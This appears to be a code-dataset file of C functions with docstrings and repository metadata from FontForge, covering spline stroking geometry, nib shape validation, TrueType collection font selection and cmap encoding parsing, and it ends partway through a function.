{"docstring": "/* A hack for cleaning up cusps and intersections on isolated\n * counter-clockwise contours -- builds an enclosing clockwise\n * rectangle, runs remove-overlap, and removes the rectangle.\n */\n", "func_signal": "static SplineSet *SplineContourOuterCCWRemoveOverlap(SplineSet *ss)", "code": "{\n    DBounds b;\n    SplineSet *ss_tmp, *ss_last = NULL;\n\n    SplineSetQuickBounds(ss,&b);\n    b.minx -= 100;\n    b.miny -= 100;\n    b.maxx += 100;\n    b.maxy += 100;\n\n    ss_tmp = chunkalloc(sizeof(SplineSet));\n    ss_tmp->first = ss_tmp->last = SplinePointCreate(b.minx,b.miny);\n    SplineSetLineTo(ss_tmp, (BasePoint) { b.minx, b.maxy } );\n    SplineSetLineTo(ss_tmp, (BasePoint) { b.maxx, b.maxy } );\n    SplineSetLineTo(ss_tmp, (BasePoint) { b.maxx, b.miny } );\n    SplineMake3(ss_tmp->last, ss_tmp->first);\n    ss_tmp->last = ss_tmp->first;\n    ss->next = ss_tmp;\n    ss=SplineSetRemoveOverlap(NULL,ss,over_remove);\n    for ( ss_tmp=ss; ss_tmp!=NULL; ss_last=ss_tmp, ss_tmp=ss_tmp->next ) {\n\tif ( ss_tmp->first->me.x==b.minx || ss_tmp->first->me.x==b.maxx ) {\n\t    if ( ss_last==NULL )\n\t\tss = ss->next;\n    \t    else\n\t\tss_last->next = ss_tmp->next;\n\t    ss_tmp->next = NULL;\n\t    SplinePointListFree(ss_tmp);\n\t    return ss;\n\t}\n    }\n    assert(0);\n    return ss;\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* The index into c->nibcorners associated with unit tangent ut\n */\n", "func_signal": "static int _IndexForUTanVec(NibCorner *nc, int n, BasePoint ut, int nci_hint)", "code": "{\n    int nci;\n\n    assert( nci_hint == -1 || (nci_hint >= 0 && nci_hint < n ) );\n\n    if (   nci_hint != -1\n        && UTanVecsSequent(nc[nci_hint].utv[NC_IN_IDX], ut,\n\t                   nc[N_NEXTI(n, nci_hint)].utv[NC_IN_IDX],\n                           false) )\n\tnci = nci_hint;\n    else // XXX Replace with binary search\n\tfor (nci = 0; nci<n; ++nci)\n\t    if ( UTanVecsSequent(nc[nci].utv[NC_IN_IDX], ut,\n\t                         nc[N_NEXTI(n, nci)].utv[NC_IN_IDX],\n\t                         false) )\n\t\tbreak;\n    assert(nci < n);\n    return nci;\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/******************************************************************************/\n/* ******************************* Main Loop ******************************** */\n/******************************************************************************/\n", "func_signal": "static SplineSet *OffsetSplineSet(SplineSet *ss, StrokeContext *c)", "code": "{\n    NibOffset no;\n    Spline *s, *first=NULL;\n    SplineSet *left=NULL, *right=NULL, *cur;\n    SplinePoint *sp;\n    BasePoint ut_ini = BPUNINIT, ut_start, ut_mid, ut_endlast;\n    BasePoint sxy;\n    bigreal last_t, t;\n    int is_right, linear, curved, on_cusp;\n    int is_ccw_ini = false, is_ccw_start, is_ccw_mid, was_ccw = false;\n    int closed = ss->first->prev!=NULL;\n\n    if ( (c->contour_was_ccw ? !c->remove_inner : !c->remove_outer) || !closed )\n\tleft = chunkalloc(sizeof(SplineSet));\n    if ( (c->contour_was_ccw ? !c->remove_outer : !c->remove_inner) || !closed )\n\tright = chunkalloc(sizeof(SplineSet));\n\n    for ( s=ss->first->next; s!=NULL && s!=first; s=s->to->next ) {\n\tif ( first==NULL )\n\t    first = s;\n\n\tif ( SplineLength(s)==0 ) // Can ignore zero length splines\n\t    continue;\n\n\tut_start = SplineUTanVecAt(s, 0.0);\n\tlinear = SplineIsLinearish(s);\n\tif ( linear ) {\n\t    is_ccw_start = 0;\n\t} else {\n\t    is_ccw_start = SplineTurningCCWAt(s, 0.0);\n\t}\n\tif ( BPIsUninit(ut_ini) ) {\n\t    ut_ini = ut_start;\n\t    is_ccw_ini = is_ccw_start;\n\t}\n\n\t// Left then right\n\tfor ( is_right=0; is_right<=1; ++is_right ) {\n\n\t    if ( is_right ) {\n\t\tif ( right==NULL )\n\t\t    continue;\n\t\tcur = right;\n\t    } else {\n\t\tif ( left==NULL )\n\t\t    continue;\n\t\tcur = left;\n\t    }\n\n\t    sxy = SPLINEPVAL(s, 0.0);\n\t    CalcNibOffset(c, ut_start, is_right, &no, -1);\n\n\t    HandleJoin(c, s, cur, sxy, &no, is_ccw_start,\n\t               ut_endlast, was_ccw, is_right);\n\n\t    on_cusp = OffsetOnCuspAt(c, s, 0.0, &no, is_right, is_ccw_start);\n\n\t    // The path for this spline\n\t    if ( linear ) {\n\t\tsxy = SPLINEPVAL(s, 1.0);\n\t\tSplineSetLineTo(cur, BPAdd(sxy, no.off[is_ccw_start]));\n\t    } else {\n\t\tt = 0.0;\n\t\tut_mid = ut_start;\n\t\tis_ccw_mid = is_ccw_start;\n\t\twhile ( t < 1.0 ) {\n\t\t    last_t = t;\n\t\t    t = SplineStrokeNextT(c, s, t, is_ccw_mid, &ut_mid, &curved,\n\t\t                          is_right, no.nci[is_ccw_mid]);\n\t\t    assert( t > last_t && t <= 1.0 );\n\n\t\t    if ( curved )\n\t\t\tsp = TraceAndFitSpline(c, s, last_t, t, cur->last,\n\t\t\t                       no.nci[is_ccw_mid], is_right,\n\t\t\t                       on_cusp);\n\t\t    else\n\t\t\tsp = AppendCubicSplinePortion(s, last_t, t, cur->last);\n\n\t\t    cur->last = sp;\n\n\t\t    sxy = SPLINEPVAL(s, t);\n\t\t    CalcNibOffset(c, ut_mid, is_right, &no, no.nci[is_ccw_mid]);\n\t\t    is_ccw_mid = SplineTurningCCWAt(s, t);\n\t\t    SplineStrokeAppendFixup(cur->last, sxy, &no, -1,\n\t\t                            c->log_maxdim);\n\n\t\t    if ( t < 1.0 )\n\t\t\tHandleFlat(cur, sxy, &no, is_ccw_mid);\n\t\t    on_cusp = OffsetOnCuspAt(c, s, t, &no, is_right, is_ccw_mid);\n\t\t}\n\t    }\n\t}\n\tut_endlast = SplineUTanVecAt(s, 1.0);\n        was_ccw = SplineTurningCCWAt(s, 1.0);\n    }\n    if (    (left!=NULL && left->first==NULL)\n         || (right!=NULL && right->first==NULL) ) {\n\t// The path (presumably) had only zero-length splines\n\tLogError( _(\"Warning: No stroke output for contour\\n\") );\n\tassert(    (left==NULL || left->first==NULL)\n\t        && (right==NULL || right->first==NULL) );\n\tchunkfree(left, sizeof(SplineSet));\n\tchunkfree(right, sizeof(SplineSet));\n\treturn NULL;\n    }\n    cur = NULL;\n    if ( !closed ) {\n\tHandleCap(c, left, ss->last->me, ut_endlast, right->last->me, true);\n\tSplineSetReverse(right);\n\tleft->next = right;\n\tright = NULL;\n\tSplineSetJoin(left, true, FIXUP_MARGIN*c->log_maxdim, &closed, false);\n\tif ( !closed )\n\t     LogError( _(\"Warning: Contour end did not close\\n\") );\n\telse {\n\t    HandleCap(c, left, ss->first->me, ut_ini, left->first->me, false);\n\t    SplineSetJoin(left, true, FIXUP_MARGIN*c->log_maxdim, &closed, true);\n\t    if ( !closed )\n\t\tLogError( _(\"Warning: Contour start did not close\\n\") );\n\t    else {\n\t\tif ( c->rmov==srmov_contour )\n\t\t    left = SplineSetRemoveOverlap(NULL,left,over_remove);\n\t\t// Open paths don't always produce clockwise output\n\t\tis_ccw_mid = SplinePointListIsClockwise(left);\n\t\tif ( is_ccw_mid==0 && left->next==NULL ) {\n\t\t    SplineSetReverse(left);\n\t\t    is_ccw_mid=1;\n\t\t}\n\t\tif ( is_ccw_mid==-1 && c->rmov!=srmov_none ) {\n\t\t    assert( c->rmov!=srmov_contour );\n\t\t    left = SplineSetRemoveOverlap(NULL,left,over_remove);\n\t\t    is_ccw_mid = SplinePointListIsClockwise(left);\n\t\t    assert( is_ccw_mid!=-1 );\n\t\t} else if ( is_ccw_mid==-1 ) {\n\t\t    LogError( _(\"Warning: Can't identify contour direction, \"\n\t\t                \"assuming clockwise\\n\") );\n\t\t}\n\t    }\n\t}\n\tcur = left;\n\tleft = NULL;\n    } else {\n\t// This can fail if the source contour is closed in a strange way\n\tif ( left!=NULL ) {\n\t    CalcNibOffset(c, ut_ini, false, &no, -1);\n\t    HandleJoin(c, ss->first->next, left, ss->first->me, &no,\n\t               is_ccw_ini, ut_endlast, was_ccw, false);\n            left = SplineSetJoin(left, true, FIXUP_MARGIN*c->log_maxdim,\n\t                         &closed, true);\n\t    if ( !closed )\n\t\tLogError( _(\"Warning: Left contour did not close\\n\") );\n\t    else if ( c->rmov==srmov_contour )\n\t\tleft = SplineSetRemoveOverlap(NULL,left,over_remove);\n\t    cur = left;\n\t    left = NULL;\n\t}\n\tif ( right!=NULL ) {\n\t    CalcNibOffset(c, ut_ini, true, &no, -1);\n\t    HandleJoin(c, ss->first->next, right, ss->first->me, &no,\n\t               is_ccw_ini, ut_endlast, was_ccw, true);\n            right = SplineSetJoin(right, true, FIXUP_MARGIN*c->log_maxdim,\n\t                          &closed, true);\n\t    if ( !closed )\n\t\tLogError( _(\"Warning: Right contour did not close\\n\") );\n\t    else {\n\t\tSplineSetReverse(right);\n\t\tif ( c->rmov!=srmov_none )\n\t\t    // Need to do this for either srmov_contour or srmov_layer\n\t\t    right = SplineContourOuterCCWRemoveOverlap(right);\n\t    }\n\t    if ( cur != NULL ) {\n\t\tcur->next = right;\n\t    } else\n\t\tcur = right;\n\t    right = NULL;\n\t}\n    }\n    return cur;\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* Return values:\n * > 0 -> number of intersections\n *   0 -> No overlap\n *  -1 -> Circle 2 is strictly inside circle 1\n *  -2 -> Circle 1 is strictly inside circle 2\n */\n", "func_signal": "static int CirclesTest(BasePoint c1, bigreal r1, BasePoint c2, bigreal r2)", "code": "{\n    bigreal c_dist = BPDist(c1, c2);\n\n    assert( r1 >= 0 && r2 >= 0 );\n    if (fabs(c_dist - r1 - r2) < 1e-3)\n\treturn 1;\n    else if (c_dist > r1 + r2)\n\treturn 0;\n    else if (c_dist < fabs(r1 - r2)) {\n\tif (r1 > r2)\n\t    return -1;\n\telse\n\t    return -2;\n    } else\n\treturn 2;\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* Note that is_ccw relates to the relevant NibOffset entries, and not\n * necessarily the direction of the curve at t.\n */\n", "func_signal": "static int OffsetOnCuspAt(StrokeContext *c, Spline *s, bigreal t,\n                          NibOffset *nop, int is_right, int is_ccw)", "code": "{\n    bigreal cs, cn;\n    NibOffset no;\n\n    cs = SplineCurvature(s, t);\n\n    // Cusps aren't a problem when increasing the radius of the curve\n    if ( (cs>0)==is_right )\n\treturn false;\n\n    if ( nop==NULL ) {\n\tnop = &no;\n\tCalcNibOffset(c, SplineUTanVecAt(s, t), is_right, nop, -1);\n    }\n    cn = SplineCurvature(c->nibcorners[nop->nci[is_ccw]].on_nib->next, nop->nt);\n\n    return RealWithin(cn, 0, 1e-6) ? false : is_right ? (cn >= cs) : (cn >= -cs);\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* A contour is a valid convex polygon if:\n *  1. It contains something (not a line or a single point\n *     but a closed piecewise spline containing area)\n *  2. All edges/splines are lines\n *  3. It is convex\n *  4. There are no extraneous points on the edges\n *\n * A contour is a valid nib shape if:\n *  5. It's on-curve points would form a valid convex\n *     polygon if there were no control points.\n *  6. Every edge/spline is either:\n *     6a. A line, or\n *     6b. A spline where *both* control points are:\n *         6bi.  Inside the triangle formed by the spline's from/to edge\n *               and extending the lines of the adjacent edges**, and\n *         6bii. The line segment of each control point does not\n *               cross the extended line of the other control point.\n *         ** Simplification -- see documentation and lref_cp below.\n */\n", "func_signal": "enum ShapeType NibIsValid(SplineSet *ss)", "code": "{\n    Spline *s;\n    BasePoint lref_cp;\n    bigreal d, anglesum = 0, angle, last_angle;\n    int n = 1;\n\n    if ( ss->first==NULL )\n\treturn Shape_TooFewPoints;\n    if ( ss->first->prev==NULL )\n\treturn Shape_NotClosed;\n    if ( SplinePointListIsClockwise(ss)!=1 )\n\treturn Shape_CCW;\n    if ( ss->first->next->order2 )\n\treturn Shape_Quadratic;\n\n    s = ss->first->prev;\n    last_angle = atan2(s->to->me.y - s->from->me.y,\n                       s->to->me.x - s->from->me.x);\n    if ( SplineIsLinear(s) )\n\tlref_cp = s->from->me;\n    else\n\tlref_cp = s->to->prevcp;\n\n    s = ss->first->next;\n    SplinePointListSelect(ss, false);\n    SplinePointListClearCPSel(ss);\n    // Polygonal checks\n    while ( true ) {\n\ts->from->selected = true;\n\tif ( BPWithin(s->from->me, s->to->me,1e-2) )\n\t    return Shape_TinySpline;\n\tangle = atan2(s->to->me.y - s->from->me.y, s->to->me.x - s->from->me.x);\n\tif ( RealWithin(angle, last_angle, 1e-4) )\n\t    return Shape_PointOnEdge;\n\td = last_angle-angle;\n\td = NormAngle(d);\n\tif ( d<0 )\n\t    return Shape_CCWTurn;\n\tanglesum += d;\n\ts->from->selected = false;\n\tlast_angle = angle;\n\ts=s->to->next;\n\tif ( s==ss->first->next )\n\t    break;\n\t++n;\n    }\n    if ( n<3 )\n\treturn Shape_TooFewPoints;\n    if ( !RealWithin(anglesum, 2*FF_PI, 1e-1) )\n\treturn Shape_SelfIntersects;\n\n    assert( s==ss->first->next );\n    // Curve/control point checks\n    while ( true ) {\n\tif ( SplineIsLinear(s) )\n\t    lref_cp = s->from->me;\n\telse {\n\t    if ( s->from->nonextcp || BPNear(s->from->nextcp, s->from->me) ||\n\t         s->to->noprevcp || BPNear(s->to->prevcp, s->to->me) )\n\t\treturn Shape_HalfLinear;\n\t    s->from->nextcpselected = true;\n\t    if ( LineSameSide(s->from->me, s->to->me, s->from->nextcp,\n\t                      s->from->prev->from->me, false) )\n\t\treturn Shape_BadCP_R1;\n\t    if ( !LineSameSide(lref_cp, s->from->me,\n\t                       s->from->nextcp, s->to->me, true) )\n\t\treturn Shape_BadCP_R2;\n\t    if ( !LineSameSide(s->to->me, s->to->prevcp,\n\t                       s->from->nextcp, s->from->me, true) )\n\t\treturn Shape_BadCP_R3;\n\t    s->from->nextcpselected = false;\n\t    s->from->selected = false;\n\t    s->to->selected = true;\n\t    s->to->prevcpselected = true;\n\t    if ( LineSameSide(s->from->me, s->to->me, s->to->prevcp,\n\t                      s->to->next->to->me, false) )\n\t\treturn Shape_BadCP_R1;\n\t    if ( !LineSameSide(s->to->me, s->to->next->to->me,\n\t                       s->to->prevcp, s->from->me, true) )\n\t\treturn Shape_BadCP_R2;\n\t    if ( !LineSameSide(s->from->me, s->from->nextcp,\n\t                       s->to->prevcp, s->to->me, true) )\n\t\treturn Shape_BadCP_R3;\n\t    s->to->prevcpselected = false;\n\t    s->to->selected = false;\n\t    lref_cp = s->to->prevcp;\n\t}\n\ts=s->to->next;\n\tif ( s==ss->first->next )\n\t    break;\n    }\n    return Shape_Convex;\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* Example filename strings with appended font selector:                     */\n/*     ./tests/fonts/mingliu.windows.ttc(PMingLiU)                           */\n/*     ./tests/fonts/mingliu.windows.ttc(1)                                  */\n/*                                                                           */\n/* 'offsets' is a list of file offsets to each enclosed TTF offset table.    */\n/* 'names' is a list of font names as found in each enclosed name table.     */\n/* 'names' is used to search for a matching font name, or to present as a    */\n/*    list to the user via ff_choose() to select from.                       */\n/*  Once the chosen font index is determined, offsets[choice] is used to     */\n/*    call fseek() to position to the chosen TTF header offset table. Then   */\n/*    the chosen font name is copied into 'chosenname'.                      */\n", "func_signal": "static int PickTTFFont(FILE *ttf, struct ttfinfo *info)", "code": "{\n    int32 *offsets, cnt, i, choice;\n    char **names;\n\n    /* TTCF version = */ getlong(ttf);\n    cnt = getlong(ttf);\n    if ( cnt==1 ) {\n\t/* This is easy, don't bother to ask the user, there's no choice */\n\tint32 offset = getlong(ttf);\n\tfseek(ttf,offset,SEEK_SET);\n        return( true );\n    }\n\n    offsets = malloc(cnt*sizeof(int32));\n    for ( i=0; i<cnt; ++i )\n\toffsets[i] = getlong(ttf);\n    names = malloc(cnt*sizeof(char *));\n    for ( i=0; i<cnt; ++i ) {\n\tnames[i] = TTFGetFontName(ttf,offsets[i],0);\n        if ( names[i]==NULL ) \n            names[i] = smprintf(\"<Unknown font name %d>\", i+1);\n    }\n    if ( info->chosenname!=NULL ) {\n\tfor ( choice=cnt-1; choice>=0; --choice )\n            if ( names[choice]!=NULL )\n\t        if ( strcmp(names[choice],info->chosenname)==0 )\n\t            break;\n\tif ( choice==-1 ) {\n\t    char *end;\n\t    choice = strtol(info->chosenname,&end,10);\n\t    if ( *end!='\\0' )\n\t\tchoice = -1;\n            else if ( choice < 0 || choice >= cnt )\n\t\tchoice = -1;\n\t}\n\tif ( choice==-1 ) {\n\t    ff_post_error(_(\"Not in Collection\"),\n/* GT: The user is trying to open a font file which contains multiple fonts and */\n/* GT: has asked for a font which is not in that file. */\n\t\t    _(\"%1$s is not in font file\"),info->chosenname);\n\t}\n    } else if ( no_windowing_ui )\n\tchoice = 0;\n    else\n\tchoice = ff_choose(_(\"Pick a font, any font...\"),(const char **) names,cnt,0,_(\"There are multiple fonts in this file, pick one\"));\n    if ( choice < -1 || choice >= cnt )\n        choice = -1;\n    if ( choice!=-1 ) {\n        /* position file to start of the chosen TTF font header */\n\tfseek(ttf,offsets[choice],SEEK_SET);\n\tif (info->chosenname != NULL)\n\t    free(info->chosenname);\n\tinfo->chosenname = names[choice];\n\tnames[choice] = NULL;\n    }\n    for ( i=0; i<cnt; ++i )\n\tfree(names[i]);\n    free(names);\n    free(offsets);\nreturn( choice!=-1);\n}", "path": "fontforge/fontforge/parsettf.c", "commit_date": "2020-03-05 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* (When necessary) extends the splines drawn by an arbitrary nib at angle\n * ut (so either a cap or a 180 degree join) so have a butt geometry (for\n * a butt/square end or to add a semi-circle on to).\n */\n", "func_signal": "static void CalcExtend(BasePoint refp, BasePoint ut, BasePoint op1,\n                       BasePoint op2, bigreal min,\n                       BasePoint *np1, BasePoint *np2)", "code": "{\n    bigreal extra=0, tmp;\n    int intersects;\n    BasePoint cop1 = BPAdd(op1, ut), cop2 = BPAdd(op2, ut);\n    BasePoint clip1 = BPAdd(refp, BPScale(ut, min)), cliput = BP90CW(ut);\n    BasePoint clip2 = BPAdd(clip1, cliput);\n\n    if ( !LineSameSide(clip1, clip2, op1, refp, false) )\n\textra = LineDist(clip1, clip2, op1);\n    if ( !LineSameSide(clip1, clip2, op2, refp, false) ) {\n\ttmp = LineDist(clip1, clip2, op2);\n\tif (tmp > extra)\n\t    extra = tmp;\n    }\n    if (extra > 0) {\n\tclip1 = BPAdd(refp, BPScale(ut, min+extra));\n\tclip2 = BPAdd(clip1, cliput);\n    }\n    intersects = IntersectLines(np1, &op1, &cop1, &clip1, &clip2);\n    VASSERT(intersects);\n    intersects = IntersectLines(np2, &op2, &cop2, &clip1, &clip2);\n    VASSERT(intersects);\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* ************************************************************************** */\n/* ****************************** Spiro Points ****************************** */\n/* ************************************************************************** */\n", "func_signal": "static void SpiroFillup(GIData *ci, int except_cid)", "code": "{\n    char buffer[50];\n    int ty;\n\n    mysprintf(buffer, \"%.2f\", ci->curcp->x );\n    if ( except_cid!=CID_BaseX )\n\tGGadgetSetTitle8(GWidgetGetControl(ci->gw,CID_BaseX),buffer);\n\n    mysprintf(buffer, \"%.2f\", ci->curcp->y );\n    if ( except_cid!=CID_BaseY )\n\tGGadgetSetTitle8(GWidgetGetControl(ci->gw,CID_BaseY),buffer);\n\n    ty = ci->curcp->ty&0x7f;\n    if ( ty == SPIRO_OPEN_CONTOUR )\n\tty = SPIRO_G4;\n    GGadgetSetChecked(GWidgetGetControl(ci->gw,CID_Curve), ty==SPIRO_G4 );\n    GGadgetSetChecked(GWidgetGetControl(ci->gw,CID_Tangent), ty==SPIRO_G2 );\n    GGadgetSetChecked(GWidgetGetControl(ci->gw,CID_Corner), ty==SPIRO_CORNER );\n    GGadgetSetChecked(GWidgetGetControl(ci->gw,CID_SpiroLeft), ty==SPIRO_LEFT );\n    GGadgetSetChecked(GWidgetGetControl(ci->gw,CID_SpiroRight), ty==SPIRO_RIGHT );\n}", "path": "fontforge/fontforgeexe/cvgetinfo.c", "commit_date": "2020-02-23 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* Copies the portion of s from t_fm to t_to and then translates\n * and appends it to tailp. The new end point is returned. \"Reversing\"\n * t_fm and t_to reverses the copy's direction.\n *\n * Direct calculations cribbed from https://stackoverflow.com/a/879213\n */\n", "func_signal": "SplinePoint *AppendCubicSplinePortion(Spline *s, bigreal t_fm, bigreal t_to,\n                                      SplinePoint *tailp)", "code": "{\n    extended u_fm = 1-t_fm, u_to = 1-t_to;\n    SplinePoint *sp;\n    BasePoint v, qf, qcf, qct, qt;\n\n    // XXX maybe this should be length based\n    if ( RealWithin(t_fm, t_to, 1e-4) )\n\treturn tailp;\n\n    // Intermediate calculations\n    qf.x =    s->from->me.x*u_fm*u_fm\n            + s->from->nextcp.x*2*t_fm*u_fm\n            + s->to->prevcp.x*t_fm*t_fm;\n    qcf.x =   s->from->me.x*u_to*u_to\n            + s->from->nextcp.x*2*t_to*u_to\n            + s->to->prevcp.x*t_to*t_to;\n    qct.x =   s->from->nextcp.x*u_fm*u_fm\n            + s->to->prevcp.x*2*t_fm*u_fm\n            + s->to->me.x*t_fm*t_fm;\n    qt.x =    s->from->nextcp.x*u_to*u_to\n            + s->to->prevcp.x*2*t_to*u_to\n            + s->to->me.x*t_to*t_to;\n\n    qf.y =    s->from->me.y*u_fm*u_fm\n\t    + s->from->nextcp.y*2*t_fm*u_fm\n            + s->to->prevcp.y*t_fm*t_fm;\n    qcf.y =   s->from->me.y*u_to*u_to\n            + s->from->nextcp.y*2*t_to*u_to\n            + s->to->prevcp.y*t_to*t_to;\n    qct.y =   s->from->nextcp.y*u_fm*u_fm\n            + s->to->prevcp.y*2*t_fm*u_fm\n            + s->to->me.y*t_fm*t_fm;\n    qt.y =    s->from->nextcp.y*u_to*u_to\n            + s->to->prevcp.y*2*t_to*u_to\n            + s->to->me.y*t_to*t_to;\n\n    // Difference vector to offset other points\n    v.x = tailp->me.x - (qf.x*u_fm + qct.x*t_fm);\n    v.y = tailp->me.y - (qf.y*u_fm + qct.y*t_fm);\n\n    sp = SplinePointCreate(qcf.x*u_to + qt.x*t_to + v.x,\n                            qcf.y*u_to + qt.y*t_to + v.y);\n\n    tailp->nonextcp = false; sp->noprevcp = false;\n    tailp->nextcp.x = qf.x*u_to + qct.x*t_to + v.x;\n    tailp->nextcp.y = qf.y*u_to + qct.y*t_to + v.y;\n    sp->prevcp.x = qcf.x*u_fm + qt.x*t_fm + v.x;\n    sp->prevcp.y = qcf.y*u_fm + qt.y*t_fm + v.y;\n\n    SplineMake3(tailp,sp);\n\n    if ( SplineIsLinear(tailp->next)) { // Linearish instead?\n        tailp->nextcp = tailp->me;\n        sp->prevcp = sp->me;\n        tailp->nonextcp = sp->noprevcp = true;\n        SplineRefigure(tailp->next);\n    }\n    return sp;\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/******************************************************************************/\n/* ********************************* Utility ******************************** */\n/******************************************************************************/\n", "func_signal": "static int LineSameSide(BasePoint l1, BasePoint l2, BasePoint p, BasePoint r,\n                        int on_line_ok)", "code": "{\n    bigreal tp, tr;\n\n    tp = (l2.x-l1.x)*(p.y-l1.y) - (p.x-l1.x)*(l2.y-l1.y);\n    tr = (l2.x-l1.x)*(r.y-l1.y) - (r.x-l1.x)*(l2.y-l1.y);\n\n    if ( RealWithin(tp, 0, 1e-5) )\n\treturn on_line_ok;\n    // Rounding means we should be tolerant when on_line_ok is true.\n    // Being that tolerant when on_line_ok is false would \n    // yield too many false negatives. \n    if ( on_line_ok && RealWithin(tp, 0, 1) )\n\treturn true;\n    return signbit(tr)==signbit(tp);\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* 'cmap' table: readttfcmap */\n", "func_signal": "static void readttfencodings(FILE *ttf,struct ttfinfo *info, int justinuse)", "code": "{\n    int i,j, def, unicode_cmap, unicode4_cmap, dcnt, dcmap_cnt, dc;\n    int nencs, version, usable_encs;\n    Encoding *enc = &custom;\n    const int32 *trans=NULL;\n    enum uni_interp interp = ui_none;\n    int platform, specific;\n    int offset, encoff=0;\n    int format, len;\n    uint32 vs_map=0;\n    uint16 table[256];\n    int segCount;\n    uint16 *endchars, *startchars, *delta, *rangeOffset, *glyphs;\n    int index, last;\n    int mod = 0;\n    SplineChar *sc;\n    uint8 *used;\n    int badencwarned=false;\n    int glyph_tot;\n    Encoding *temp;\n    EncMap *map;\n    struct cmap_encs *cmap_encs, desired_cmaps[2], *dcmap;\n    extern int ask_user_for_cmap;\n\n    fseek(ttf,info->encoding_start,SEEK_SET);\n    version = getushort(ttf);\n    nencs = getushort(ttf);\n    if ( version!=0 && nencs==0 )\n\tnencs = version;\t\t/* Sometimes they are backwards */ /* Or was I just confused early on? */\n    cmap_encs = malloc(nencs*sizeof(struct cmap_encs));\n    for ( i=usable_encs=0; i<nencs; ++i ) {\n\tcmap_encs[usable_encs].platform =  getushort(ttf);\n\tcmap_encs[usable_encs].specific = getushort(ttf);\n\tcmap_encs[usable_encs].offset = getlong(ttf);\n\tif ( cmap_encs[usable_encs].platform == 0 && cmap_encs[usable_encs].specific == 5 ) {\n\t    /* This isn't a true encoding. */\n\t    /* It's an optional set of encoding modifications (sort of) */\n\t    /*  applied to a format 4/10 encoding (unicode BMP/Full) */\n\t    if ( SubtableMustBe14(ttf,info->encoding_start+cmap_encs[usable_encs].offset,info) )\n\t\tvs_map = info->encoding_start+cmap_encs[usable_encs].offset;\n    continue;\n\t}\n\ttemp = enc_from_platspec(cmap_encs[usable_encs].platform,cmap_encs[usable_encs].specific);\n\tif ( temp==NULL )\t/* iconv doesn't support this. Some sun iconvs seem limited */\n\t    temp = FindOrMakeEncoding(\"Custom\");\n\tcmap_encs[usable_encs].enc = temp;\n\tif ( SubtableIsntSupported(ttf,info->encoding_start+cmap_encs[usable_encs].offset,\n\t\t&cmap_encs[usable_encs],info))\n    continue;\n\t++usable_encs;\n    }\n    if ( usable_encs==0 ) {\n\tLogError( _(\"Could not find any valid encoding tables\" ));\n\tfree(cmap_encs);\nreturn;\n    }\n    def = -1;\n    enc = &custom;\n    unicode_cmap = unicode4_cmap = -1;\n    for ( i=0; i<usable_encs; ++i ) {\n\ttemp = cmap_encs[i].enc;\n\tplatform = cmap_encs[i].platform;\n\tspecific = cmap_encs[i].specific;\n\toffset = cmap_encs[i].offset;\n\n\tif ( (platform==3 && specific==10) || (platform==0 && specific==4) ) { /* MS Unicode 4 byte */\n\t    enc = temp;\n\t    def = i;\n\t    unicode4_cmap = i;\n\t} else if ( !enc->is_unicodefull && (!prefer_cjk_encodings ||\n\t\t(!enc->is_japanese && !enc->is_korean && !enc->is_tradchinese &&\n\t\t    !enc->is_simplechinese)) &&\n\t\t(( platform==3 && specific==1 ) || /* MS Unicode */\n/* Well I should only deal with apple unicode specific==0 (default) and 3 (U2.0 semantics) */\n/*  but apple ships dfonts with specific==1 (Unicode 1.1 semantics) */\n/*  which is stupid of them */\n\t\t( platform==0 /*&& (specific==0 || specific==3)*/ ))) {\t/* Apple Unicode */\n\t    enc = temp;\n\t    def = i;\n\t} else if ( platform==3 && specific==0 && enc->is_custom ) {\n\t    /* Only select symbol if we don't have something better */\n\t    enc = temp;\n\t    def = i;\n\t    /* Now I had assumed this would be a 1 byte encoding, but it turns*/\n\t    /*  out to map into the unicode private use area at U+f000-U+F0FF */\n\t    /*  so it's a 2 byte enc */\n/* Mac platform specific encodings are script numbers. 0=>roman, 1=>jap, 2=>big5, 3=>korean, 4=>arab, 5=>hebrew, 6=>greek, 7=>cyrillic, ... 25=>simplified chinese */\n\t} else if ( platform==1 && specific==0 && enc->is_custom ) {\n\t    enc = temp;\n\t    def = i;\n\t} else if ( platform==1 && (specific==2 ||specific==1||specific==3||specific==25) &&\n\t\t!enc->is_unicodefull &&\n\t\t(prefer_cjk_encodings || !enc->is_unicodebmp) ) {\n\t    enc = temp;\n\t    def = i;\n\t} else if ( platform==3 && (specific>=2 && specific<=6 ) &&\n\t\t!enc->is_unicodefull &&\n\t\t(prefer_cjk_encodings || !enc->is_unicodebmp) ) {\n\t    /* Old ms docs say that specific==3 => big 5, new docs say specific==4 => big5 */\n\t    /*  Ain't that jus' great? */\n\t    enc = temp;\n\t    def = i;\n\t}\n\tif ( (platform==3 && 